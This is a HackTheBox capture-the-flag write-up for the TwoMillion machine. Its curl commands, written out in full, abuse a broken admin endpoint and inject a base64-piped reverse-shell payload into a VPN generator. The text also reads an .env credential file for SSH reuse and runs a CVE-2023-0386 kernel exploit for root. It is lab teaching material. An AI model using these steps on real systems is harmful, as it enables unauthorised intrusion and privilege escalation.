# TwoMillion - HackTheBox

Linux machine running a legacy version of the HackTheBox platform with an invite-only
registration flow. The path chains JavaScript deobfuscation to recover the invite API,
broken access control to self-promote to admin, command injection in the VPN generator
for initial access, credential reuse from a `.env` file for lateral movement, and a
kernel OverlayFS exploit for root.

Target: `10.129.229.66` (`2million.htb`)

---

## Reconnaissance

```bash
nmap -sV -sC 10.129.229.66
```

Two open ports:

- SSH (22) - OpenSSH
- HTTP (80) - redirects to `2million.htb`, added to `/etc/hosts`

The site is a replica of the old HackTheBox platform with an invite code requirement
for registration.

---

## Enumeration

### Invite Code via API

The `/invite` page loads `inviteapi.min.js`, an obfuscated JavaScript file. Deobfuscating
it (de4js or similar) reveals a hidden API endpoint:

```
/api/v1/invite/how/to/generate
```

This returns a ROT13-encoded hint pointing to `/api/v1/invite/generate`. Calling it
produces a base64-encoded invite code:

```bash
curl -sX POST http://2million.htb/api/v1/invite/generate | jq -r '.data.code' | base64 -d
```

The code is generated dynamically per call, not static. Used it to register and log in,
obtaining a `PHPSESSID` cookie.

### API Enumeration

Authenticated enumeration of `/api/v1` with the session cookie lists all available
endpoints, including several admin-only routes:

- `PUT /api/v1/admin/settings/update`
- `POST /api/v1/admin/vpn/generate`

---

## Exploitation

### Broken Access Control - Self-Promote to Admin

The admin settings endpoint accepts an `is_admin` parameter without validating whether
the requesting user is already an admin. A regular user can self-promote:

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  --cookie "PHPSESSID=<session>" \
  --header "Content-Type: application/json" \
  --data '{"email":"test@2million.htb", "is_admin": 1}'
```

Response confirms the promotion: `{"id":13,"username":"test","is_admin":1}`.

### Command Injection - VPN Generator

The admin VPN generator endpoint passes the `username` parameter directly into
`shell_exec()` without sanitization. Injecting a reverse shell payload via `;`
separator:

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  --cookie "PHPSESSID=<session>" \
  --header "Content-Type: application/json" \
  --data '{"username":"test;echo <base64_reverse_shell> | base64 -d | bash;"}'
```

The base64 encoding avoids escaping issues with special characters in the shell payload.
A netcat listener catches the connection as `www-data`.

---

## Lateral Movement - Credential Reuse

The web application's `.env` file in `/var/www/html` contains database credentials.
The same password works for the system user `admin`:

```bash
cat /var/www/html/.env
ssh admin@10.129.229.66
```

User flag is in `/home/admin/user.txt`.

---

## Privilege Escalation - CVE-2023-0386 (OverlayFS)

A mail in `/var/mail/admin` from `ch4p` explicitly hints at an unpatched OverlayFS/FUSE
vulnerability. The kernel version confirms it:

```bash
uname -r
# 5.15.70-051570-generic
```

Kernel 5.15.70 is in the vulnerable range for CVE-2023-0386. The PoC requires
compilation on the target and two commands run from the same directory:

```bash
./fuse ./ovlcap/lower ./gc &
./exp
```

`./exp` drops a root shell. Root flag is in `/root/root.txt`.

---

## Key Takeaways

- Client-side JavaScript exposes undocumented API endpoints. Deobfuscating front-end
  code is often the first real step in web application testing - the invite flow was
  entirely solvable from the JS source.
- Broken access control on admin endpoints is a classic logic bug: the API checked
  whether `is_admin` existed in the request but not whether the requester had the right
  to set it. OWASP Top 10 number one for a reason.
- Always read configuration files post-exploitation. `.env`, `wp-config.php`,
  `config.php` - credential reuse between application databases and system accounts
  is a recurring lateral movement pattern.
- Kernel CVE exploitation requires matching the exact kernel version to the right PoC.
  `uname -r` is a mandatory post-exploitation check, and `/var/mail` can contain
  explicit hints in CTF contexts.

---

## Disclaimer

This box was completed in the controlled, legal environment provided by HackTheBox.
All actions were performed strictly for educational purposes.
